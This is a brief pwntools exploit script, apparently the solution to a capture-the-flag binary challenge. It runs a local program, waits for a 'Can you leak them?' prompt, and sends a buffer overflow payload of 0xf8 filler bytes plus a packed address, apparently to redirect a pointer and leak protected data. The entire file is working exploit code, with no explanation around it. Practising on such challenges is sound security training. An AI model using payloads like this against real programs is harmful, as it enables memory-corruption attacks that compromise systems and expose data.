from pwn import *

sh = process("/problems/f40b87850361e15d57961cd21f8dfc09/argv0")

sh.recvuntil("Can you leak them?\n")

payload = "A" * 0xf8 + p32(0x80499c0)

sh.send(payload)

print sh.recv()